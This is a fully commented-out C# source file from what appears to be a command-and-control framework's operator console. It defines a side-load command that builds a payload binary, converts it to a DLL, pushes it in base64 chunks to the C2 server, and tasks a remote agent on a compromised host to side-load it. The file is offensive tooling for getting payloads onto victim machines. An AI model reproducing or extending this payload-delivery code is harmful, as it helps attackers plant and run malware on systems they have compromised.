//using ApiModels.Response;
//using Commander.Commands;
//using Commander.Communication;
//using Commander.Executor;
//using Commander.Terminal;
//using System;
//using System.Collections.Generic;
//using System.IO;
//using System.Linq;
//using System.Text;
//using System.Threading.Tasks;

//namespace Commander
//{

//    public abstract class SiteLoadCommand : ExecutorCommand
//    {
//        public const int ChunkSize = 10000;

//        public const string RootFolder = "/Share/tmp/C2/Commander/Module";
//        public const string TmpFolder = "/Share/tmp/C2/Commander/Tmp";
//        public const string ServerFolder = "Tmp/";

//        public abstract string ExeName { get; }

//        public virtual string ComputeParams(string innerParams)
//        {
//            return innerParams;
//        }

//        protected override void InnerExecute(string label, ITerminal terminal, IExecutor executor, ICommModule comm, string parms)
//        {
            
//            terminal.WriteLine($"Generating payload with params {parms}...");
//            terminal.WriteLine(this.GenerateBin(this.ExeName, this.ComputeParams(parms), out var binFileName));

//            terminal.WriteLine($"Generating dll from bin...");
//            terminal.WriteLine(this.GenerateDllFromBin(binFileName, out var exeFileName));

//            File.Delete(binFileName);



//            terminal.WriteLine($"Pushing {exeFileName} to the server...");
//            //var binFileName = "e:\\Share\\tmp\\C2\\Custom\\b18a05ad-b7df-4fcf-b529-d6faa582ed13.bin";
//            string serverFile = ServerFolder + "/" + Path.GetFileName(exeFileName);
//            terminal.WriteLine($"ServerFile = {serverFile}...");
//            if (!this.PushFile(exeFileName, serverFile, terminal, executor, comm).Result)
//                terminal.WriteError("An error occured while uploading the file to the server");

//            File.Delete(exeFileName);

//            var agent = executor.CurrentAgent;
//            var response = comm.TaskAgent(label, Guid.NewGuid().ToString(), agent.Metadata.Id, "side-load", $"{serverFile}").Result;
//            if (!response.IsSuccessStatusCode)
//            {
//                terminal.WriteError("An error occured : " + response.StatusCode);
//                return;
//            }

//            terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");

//        }


//        protected string GetRandomName()
//        {
//            return Guid.NewGuid().ToString();
//        }
//        protected string GenerateBin(string exename, string parameters, out string binPath)
//        {
//            string inputPath = Path.Combine(RootFolder, exename);
//            var name = Path.Combine(TmpFolder, GetRandomName() + ".bin");
//            string ret = Internal.BinMaker.GenerateBin(inputPath, name, parameters);
//            binPath = name;
//            return ret;
//        }

//        protected string GenerateDllFromBin(string binpath, out string dllPath)
//        {
//            var filenamewo = Path.GetFileNameWithoutExtension(binpath);
//            var name = Path.Combine(TmpFolder, filenamewo + ".dll");
//            string ret = Internal.BinMaker.GenerateDll(binpath, name);
//            dllPath = name;
//            return ret;
//        }


//        protected async Task<bool> PushFile(string fileName, string remoteName, ITerminal terminal, IExecutor executor, ICommModule comm)
//        {
//            var path = fileName;
//            if (!File.Exists(path))
//            {
//                terminal.WriteError($"File {path} does not exists!");
//                return false;
//            }


//            byte[] fileBytes = null;
//            using (FileStream fs = File.OpenRead(path))
//            {
//                fileBytes = new byte[fs.Length];
//                fs.Read(fileBytes, 0, (int)fs.Length);
//            }


//            var desc = new FileDescriptorResponse()
//            {
//                Length = fileBytes.Length,
//                ChunkSize = ChunkSize,
//                Id = Guid.NewGuid().ToString(),
//                Name = remoteName
//            };

//            var chunks = new List<FileChunckResponse>();

//            int index = 0;
//            using (var ms = new MemoryStream(fileBytes))
//            {

//                var buffer = new byte[ChunkSize];
//                int numBytesToRead = (int)ms.Length;

//                while (numBytesToRead > 0)
//                {

//                    int n = ms.Read(buffer, 0, ChunkSize);
//                    //var data =
//                    var chunk = new FileChunckResponse()
//                    {
//                        FileId = desc.Id,
//                        Data = System.Convert.ToBase64String(buffer.Take(n).ToArray()),
//                        Index = index,
//                    };
//                    chunks.Add(chunk);
//                    numBytesToRead -= n;

//                    index++;
//                }
//            }

//            desc.ChunkCount = chunks.Count;

//            var result = await comm.PushFileDescriptor(desc);
//            if (!result.IsSuccessStatusCode)
//            {
//                var cont = await result.Content.ReadAsStringAsync();
//                terminal.WriteError($"An error occured : {result.StatusCode} - {cont}");
//                return false;
//            }

//            index = 0;
//            foreach (var chunk in chunks)
//            {
//                result = await comm.PushFileChunk(chunk);
//                if (!result.IsSuccessStatusCode)
//                {
//                    var cont = await result.Content.ReadAsStringAsync();
//                    terminal.WriteError($"An error occured : {result.StatusCode} - {cont}");
//                    return false;
//                }
//                index++;
//            }

//            terminal.WriteInfo($"File uploaded to {remoteName}.");

//            return true;
//        }
//    }
//}
